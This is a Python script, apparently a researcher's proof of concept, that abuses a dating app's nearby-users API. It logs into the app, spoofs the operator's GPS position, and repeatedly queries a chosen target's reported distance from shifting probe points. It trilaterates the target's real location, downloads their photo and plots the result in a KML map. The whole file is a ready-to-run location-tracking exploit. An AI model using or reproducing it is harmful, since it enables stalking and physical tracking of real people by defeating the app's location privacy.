#!/usr/bin/env python

# Summary: This scripts gather data from the "XXXXXX" dating app around some coordinates or city
#          Then, it uses the information gathered to geolocate the user using trilateration.
# Author: Felipe Molina (@felmoltor)
# Date: 2021-02

# General libraries
import os,sys
from pathlib import Path
import csv
from optparse import OptionParser
import math
from time import sleep
from random import randint,uniform
import matplotlib.pyplot as plt
import json
import requests
from requests.auth import HTTPBasicAuth
from datetime import datetime
import urllib3
urllib3.disable_warnings()
import re
from ColorMessages import *
# Geographic Libraries
from geopy.geocoders import Nominatim
from shapely import geometry
import utm
from shapely.geometry import LineString
import simplekml
from polycircles import polycircles

AUT_GEOLOC="https://api.sampledatingapp.com/api/v4/geoloc"
AUT_GET_NEARBY="https://api.sampledatingapp.com/api/v4/geoloc?page[limit]=40&include=user&fields[user]=basic"
AUT_GET_USERINFO="https://api.sampledatingapp.com/api/v4/users/<USER_ID>?fields%5Buser%5D=basic%2Cothers%2Chashtags%2Cpictures%2Castro&include=hashtags%2Cpictures"
FAKE_OFFSET=0 # originally was 70 meters
# To be sure that we are not going to receive the dummy distance of 300 meters from the AUT servers
# We add aproximately 333 meters to the east to our chosen point.
# We use the aproximations proposed on this page: https://www.usna.edu/Users/oceano/pguth/md_help/html/approx_equivalents.htm
# 1° = 111 km
# 0.001° = 111 m
# 0.003° = 333 m
# 0.003° = 444 m
SKEWED_DEGREES=0.005
GIVEUP_ATTEMPTS=8
MOVE_PROBE_ATTEMPTS=2
USER_AGENT="SampleDatingApp/4.5.1:524 (Android 6.0.1; Xiaomi; MI 5s; Build/MXB48T; Store)"
COOLDOWN=60         # Cooldown time (in seconds) before asking AUT again for the same username
FOUND_COOLDOWN=30   # Cooldown time (in seconds) before asking AUT for a new geo position around the target username
OK_THRESHOLD=10     # Distance to stop querying AUT for the target user
CIRCLE_RESOLUTION=180
TARGET_FILE="data/target.csv"
GOOGLE_EARTH_PATH="/usr/bin/google-earth-pro"

class DatingAppUser():
    def __init__(self):
        self.id=None
        self.pseudo=None
        self.online=None
        self.sex=None
        self.title=None
        self.age=None
        self.city=None
        self.cover=None # This is the URL where the photo is stored. We have to append "/full" at the end to get the full photo
        self.dead=None
        self.count_pics=None
        self.timestamp=None
        self.latitude=None
        self.longitude=None
        self.distance=None
        self.photo_path=None # The photo location on our hard drive
        self.found=False

def get_options():
    parser = OptionParser()
    parser.add_option("-u", "--user", dest="username",
                    help="Username of your account", default=None)
    parser.add_option("-p", "--password", dest="password",
                    help="Password of your account", default=None)
    parser.add_option("-l", "--lat", dest="latitude",
                    help="Latitude of your coordinates", default=None)
    parser.add_option("-L", "--long", dest="longitude",
                    help="Longitude of your coordinates", default=None)
    parser.add_option("-c", "--city", dest="city",
                    help="City name or address where you want to locate the user", default=None)
    parser.add_option("-t", "--target", dest="target",
                    help="Target AUT ID number or", default=None)
    parser.add_option("-o", "--output", dest="output",
                    help="Output file name", default="data/coordinates.csv")
    parser.add_option("-k", "--kml", dest="kml",
                    help="Output KML path", default="output/target.kml")
    parser.add_option("-P", "--proxy", dest="proxy",
                    help="Proxy to send the requests through (default: None)", default=None)
    parser.add_option("-q", "--quiet",
                    action="store_false", dest="verbose", default=True,
                    help="don't print status messages to stdout")

    (options, args) = parser.parse_args()
    return options

# Formula extracted from https://stackoverflow.com/questions/7477003/calculating-new-longitude-latitude-from-old-n-meters
# If we get to close to the poles ir radius is very big, this will fail
def getPerimeterPoint(center,dx,dy):
    r_earth = 6378000 # 6378 Km of radius = 6378000 metres
    # Number of Km per degree of longitude
    # (2*math.pi/360) * r_earth * cos(point.latitude)
    # Number of Km per degree of latitude
    # ((2*math.pi)/360) * r_earth = 111 km / degree 
    new_latitude  = center.y  + (dy / r_earth) * (180.0 / math.pi)
    new_longitude = center.x + (dx / r_earth) * (180.0 / math.pi) / math.cos(center.y * math.pi/180.0)
    return geometry.Point(new_latitude,new_longitude)

# This function will return the poligon drawing the circle around the center point with a radius of r
def getCirclePoints(center,radius,resolution=180):
    perimeter_points=[]
    # Iterate through the number of points around the center
    for n in range(1,resolution+1):
        # Divide the 360 degrees of a circle in "resolution" samples
        degree=n*(360.0/resolution)
        dx=math.cos(math.radians(degree))*radius
        dy=math.sin(math.radians(degree))*radius
        ppoint=(getPerimeterPoint(center,dx,dy))
        # print("#%s - Alpha %s: %s,%s" % (n,degree,ppoint.x,ppoint.y))
        perimeter_points.append(ppoint)
    
    poly = geometry.Polygon([[p.x, p.y] for p in perimeter_points])
    return poly

def getCityCoordinates(city):
    try:
        nom = Nominatim(user_agent=USER_AGENT)
        n = nom.geocode(city)
        return n.point
    except Exception as e:
        print(e)
        return None

def getDatingAppUserData(target_id,session):
    user=None

    URL=AUT_GET_USERINFO.replace("<USER_ID>",str(target_id))
    user_resp=session.get(URL)

    if (user_resp.status_code==200):
        user=DatingAppUser()
        # fill the data of the user variable
        json_user=json.loads(user_resp.text)
        attrs=json_user["data"][0]["attributes"]["basic"]
        user.id=json_user["data"][0]["id"]
        user.pseudo=attrs["pseudo"]
        user.online=attrs["online"]
        user.sex=attrs["sex"]
        user.title=attrs["title"]
        user.age=attrs["age"]
        user.city=attrs["city"]
        user.cover=attrs["cover"] # This is the URL where the photo is stored. We have to append "/full" at the end to get the full photo
        user.dead=attrs["dead"]
        user.count_pics=attrs["count_pics"]
        user.timestamp=attrs["timestamp"]
        user.latitude=None
        user.longitude=None
        user.from_point=None
        user.distance=None
        user.photo_path=None # The photo location on our hard drive
        user.found=False
        
        # Download user photo
        rnd=randint(1000,9999)
        fname=Path("images/%s_%s_%s.jpg" % (user.pseudo,user.id,rnd)).absolute()
        photo_resp=session.get(re.sub("$","/full",user.cover),stream=True)
        if (photo_resp.status_code==200):
            with open(fname, 'wb') as f:
                f.write(photo_resp.content)
            user.photo_path=fname

    return user

def spoofMyLocation(latitude,longitude,session):
    # To spoof our location in AUT app, we need to POST to /api/v4/geoloc the following data:
    # geo%5Blat%5D=<LAT>&geo%5Blng%5D=<LONG>
    data= {
        "geo[lat]":str(latitude),
        "geo[lng]":str(longitude)
    }
    coords_headers={
        "X-Lat": str(latitude),
        "X-Lng": str(longitude)
    }
    # Send our location to the server
    session.headers.update(coords_headers)
    geo_resp=session.post(AUT_GEOLOC,data=data,headers=coords_headers)
    if (geo_resp.status_code==202):
        json_resp=json.loads(geo_resp.text)
        # If the string " ha sido guardada" is present in the response
        if (" ha sido guardada" in json_resp["meta"]["message"]):
            return True
        else:
            return False
    else:
        print("Error spoofing our geolocation (%s)" % geo_resp.status_code)
        return False

def getUATNearbyPeople(user,center,session):
    # Request list of people "around you"
    people_resp=session.get(AUT_GET_NEARBY)
    if (people_resp.status_code==200):
        json_resp=json.loads(people_resp.text)
        for g in json_resp["data"]:
            if (g["id"]==user.id):
                # Transform to meters and substract the fake offset AUT is adding to all distances
                user.distance=(float(g["attributes"]["distance"])*1000)-FAKE_OFFSET 
                user.found=True  
                user.from_point=center            
    else:
        print("Error retrieving list of people nearby (%s)" % people_resp.status_code)
    
    return user

def saveTargetData(target):
    now_epoch=int(datetime.now().timestamp())
    with open(TARGET_FILE,"a") as out:
        csvwriter=csv.writer(out,delimiter=",")
        data_array=(now_epoch,target.from_point.y,target.from_point.x,target.distance,target.id,target.pseudo,target.age)
        csvwriter.writerow(data_array)

def drawTargetKml(kml_file,target,potential_location,open_kml=True):
    kml=simplekml.Kml()
    with open(TARGET_FILE,"r") as csv_file:
        csv_reader = csv.reader(csv_file, delimiter=',')

        measure_n=0
        for row in csv_reader:
            measure_n+=1
        
            lat=float(row[1])
            lon=float(row[2])
            distance=float(row[3])
            user_id=row[4]
            username=row[5]
            label="%s (%s)" % (username,user_id)
            
            polycircle = polycircles.Polycircle(latitude=lat,
                                        longitude=lon,
                                        radius=distance,
                                        number_of_vertices=CIRCLE_RESOLUTION)
            
            pol = kml.newpolygon(name="[%s] Distance to %s (%s)" % (measure_n,username,user_id),outerboundaryis=polycircle.to_kml())
            pol.style.polystyle.color = simplekml.Color.changealphaint(100, simplekml.Color.green)
    
    if (potential_location is not None):
        point_name="%s (%s)" % (username,user_id)
        target_point=kml.newpoint(name=point_name)
        target_point.coords=[(potential_location.x,potential_location.y)]
        target_point.description='%s (%s)<br/><img src="%s" alt="Target Photo" align="left" width=150 height=250 />' % (target.pseudo,target.id,str(target.photo_path))
    else:
        error("Sorry. We could not find any potential location for the user.")
    kml.save(kml_file)

    # If open is true, open with Google Earth
    if (open_kml):
        if (os.path.exists(GOOGLE_EARTH_PATH)):
            os.system('xdg-open %s' % kml_file)
        else:
            print("Google Earth path not found. Open the file '%s' manually to see the location of the target.")

# This loop is to be repeated every time we search a user around a point
def searchUserAround(user,init_point,session,cooldown=True):
    potential_location=None
    user.found=False
    user.from_point=None
    user.distance=None
    current_point=init_point
    force_move_probe=False
    giveup=False

    while (((user is not None and not user.found) or force_move_probe) and not giveup):
        user.found=False
        user.from_point=None
        user.distance=None
        force_move_probe=False

        # Iterate until the target user is found on the peer list
        missed_hits=0 # This will control how many times did we fail to locate a user on a geo position
        while (not user.found and not giveup):
            missed_hits+=1
            location_spoofed=False

            # Attempt to spoof our own location in a while loop
            while (not location_spoofed):
                location_spoofed=spoofMyLocation(current_point.y,current_point.x,session)
                if(location_spoofed):
                    info("Successfuly spoofed our location to the position %s,%s" % (current_point.y,current_point.x))
                else:
                    error("Error spoofing our own location. Trying again in %s seconds." % COOLDOWN)
                    sleep(COOLDOWN)
            # This function will return a user instance
            user=getUATNearbyPeople(user,current_point,session)
            if (user.found):
                if (user.distance == (300-FAKE_OFFSET)): # 300 - 70 meters
                    if (potential_location is None): # We only want to save the first time that we find the mark of 300 meters
                        potential_location=current_point # Save this as the potential location of our target
                    error("User %s (%s) was found %s meters away from %s,%s." % (user.id,user.pseudo,user.distance,user.from_point.y,user.from_point.x))
                    error("We got closer than 300 m to the target. Moving the search point %s degrees away from here." % SKEWED_DEGREES)
                    force_move_probe=True 
                    # Round up the new center to only 6 decimal (the same number of decimals given by the legitimate app)
                    current_point=geometry.Point(round((current_point.x)+SKEWED_DEGREES,6),round(current_point.y,6)) # X (longitude) is in position 1, Y (latitude) is in position 0
                    info("Moving the probe to %s,%s" % (current_point.y,current_point.x))
                else:
                    success("User %s (%s) was found %s meters away from %s,%s." % (user.id,user.pseudo,user.distance,user.from_point.y,user.from_point.x))

                if (cooldown):
                    info("Waiting %s seconds to continue." % FOUND_COOLDOWN)
                    sleep(FOUND_COOLDOWN)
            else:
                error("User not found. Waiting %s seconds to try again." % COOLDOWN)
                sleep(COOLDOWN)
                if (missed_hits>=GIVEUP_ATTEMPTS):
                    error("More than %s missed hits. Giving up in searching the user." % GIVEUP_ATTEMPTS)
                    giveup=True
                elif (missed_hits>=MOVE_PROBE_ATTEMPTS):
                    info("More than %s missed hits. Moving the probing point randomly" % MOVE_PROBE_ATTEMPTS-1)
                    # Move the probe to a random position
                    force_move_probe=True
                    rnd_x=uniform(0.0,SKEWED_DEGREES)
                    rnd_y=uniform(0.0,SKEWED_DEGREES)
                    if(randint(0,1)):
                        rnd_x=-rnd_x
                    if(randint(0,1)):
                        rnd_y=-rnd_y
                    current_point=geometry.Point(round((current_point.x)+rnd_x,6),round(current_point.y+rnd_y,6)) # X (longitude) is in position 1, Y (latitude) is in position 0
                    info("Moving the probe to %s,%s" % (current_point.y,current_point.x)) # Error. We dont move the prove here
    
    # Return the point and the user variable updated
    return current_point,user,potential_location

################

if __name__ == "__main__":
    # Parsing options
    options=get_options()
    init_point=None
    if (options.city is not None):
        p=getCityCoordinates(options.city)
        if (p is not None):
            init_point=geometry.Point([float(p.longitude),float(p.latitude)])
        else:
            error("Error accessing GeoPy API. Try using latitude and longitude (-l and -L flags)")
            sys.exit()
    elif (options.latitude is not None and options.longitude is not None):
        # Coordinates
        init_point=geometry.Point([float(options.longitude),float(options.latitude)]) # x,y
    else:
        error("Error. You have to specify at least an address/city (-c) or coordinates (-l and -L).")

    if (init_point is None):
        error("No init point was set. Aborting.")
        exit(1)
    else:
        # Delete old targets data
        if (os.path.exists(TARGET_FILE)):
            os.remove(TARGET_FILE)
        
        # Set up requests library session
        session = requests.Session()
        session.headers.update({'User-Agent': USER_AGENT})
        session.headers.update({'X-Platform': "android"})
        session.headers.update({'X-Client-Version': "4.3.21:509"})
        session.auth = (options.username,options.password)
        session.verify = False
        # If proxy is specified
        if (options.proxy is not None):
            m = re.match("https?:\/\/([^:]*):(\d{1,4})?\/?",options.proxy)
            if (m is not None):
                proxies = {
                    'http': options.proxy,
                    'https': options.proxy,
                }
                session.proxies.update(proxies)
            else:
                error("Specified proxy does not follow the pattern http(s)://ip:port/. Ignoring it.")
        # Requests user ID data
        user=getDatingAppUserData(options.target,session)
        
        if (user is None):
            error("The user does not exits or is nowere near to this point. Try again with a correct ID or geo location.")
            info("Suggestion: Use the -P flag to set up a proxy and watch the traffic between this script and the servers.")
            exit()

        info("#1 Searching for user id '%s' (%s) around location %s,%s" % (options.target,user.pseudo,init_point.y,init_point.x))

        ###########################
        #      User search #1     #
        ###########################
        resulting_point,user,pl=searchUserAround(user,init_point,session)
        
        # We have found the target username
        # Now, calculate a new coordinate point on the perimeter of the circle to ask Telegram API
        first_circle=getCirclePoints(resulting_point,user.distance,resolution=CIRCLE_RESOLUTION)
        # Save data into the target file
        saveTargetData(user)

        # Pick a random point of the perimeter
        r = randint(0,CIRCLE_RESOLUTION)
        random_point=first_circle.exterior.coords[r]
        new_center=geometry.Point(round(random_point[1],6),round(random_point[0],6)) # X (longitude) is in position 1, Y (latitude) is in position 0
        
        ###########################
        #      User search #2     #
        ###########################
        info("#2 Searching for user id '%s' (%s) around location %s,%s" % (options.target,user.pseudo,new_center.y,new_center.x))
        resulting_point,user,pl=searchUserAround(user,new_center,session)
            
        # We have found the target username for the second time
        # Now, intersect this circle with the previous one
        second_circle=getCirclePoints(user.from_point,user.distance,resolution=CIRCLE_RESOLUTION)
        # Save data into the target file
        saveTargetData(user)

        # Intersect first and secod circles and choose randomly between one of the two points of the intersection
        # https://gis.stackexchange.com/questions/318325/intersection-function-returns-multiple-coordinates
        third_center = None
        third_circle = None 
        fourth_center = None
        fourth_circle = None
        chosen_point=None
        discarded_point=None
        if (first_circle.intersects(second_circle)):
            circle1_points=LineString(list(first_circle.exterior.coords))
            circle2_points=LineString(list(second_circle.exterior.coords))
            inter=circle1_points.intersection(circle2_points)
            # Choose between two intersection points randomly to ask again to Telegram
            cp=randint(0,1) # Chosen random point
            dp=(cp-1)%2     # Discarded point
            chosen_point=inter[cp] 
            discarded_point=inter[dp]
            third_center=geometry.Point(round(chosen_point.y,6),round(chosen_point.x,6)) # intersection returns the point coordinates switched
            fourth_center=geometry.Point(round(discarded_point.y,6),round(discarded_point.x,6)) # intersection returns the point coordinates switched
        else:
            print("Error. Circles don't intersect. Maybe the target has moved?")

        ###########################
        #      User search #3     #
        ###########################
        info("#3 Searching for user id '%s' (%s) around location %s,%s" % (options.target,user.pseudo,third_center.y,third_center.x))
        resulting_point,user,pl=searchUserAround(user,third_center,session)
        potential_location=pl
            
        # We have found the target username for the third time
        # Now, intersect this circle with the previous one
        third_circle=getCirclePoints(user.from_point,user.distance,resolution=CIRCLE_RESOLUTION)
        # Save data into the target file
        saveTargetData(user)

        ###########################
        #      User search #4     #
        ###########################
        # If we haven't already found the target, try again from the fourth point
        if (potential_location is None):
            info("#4 Searching for user id '%s' (%s) around location %s,%s" % (options.target,user.pseudo,fourth_center.y,fourth_center.x))
            resulting_point,user,pl=searchUserAround(user,fourth_center,session,cooldown=False)
            # Save this as the potential location only if we haven't find the third center already as the potential location
            if (potential_location is None):
                potential_location=pl
            
            # We have found the target username for the third time
            # Now, intersect this circle with the previous one
            fourth_circle=getCirclePoints(user.from_point,user.distance,resolution=CIRCLE_RESOLUTION)
            # Save data into the target file
            saveTargetData(user)

        # Draw circle 1, 2, 3 and 4
        (x,y)=first_circle.exterior.xy
        (x2,y2)=second_circle.exterior.xy
        (x3,y3)=third_circle.exterior.xy
        plt.plot(y,x)
        plt.plot(y2,x2)
        plt.plot(y3,x3)
        if (fourth_circle is not None):
            (x4,y4)=fourth_circle.exterior.xy
            plt.plot(y4,x4)
        plt.ylabel="Latitude"
        plt.xlabel="Longitude"
        plt.show()
        
        print("Generating the result KML file")
        drawTargetKml(options.kml,user,potential_location,open_kml=True)

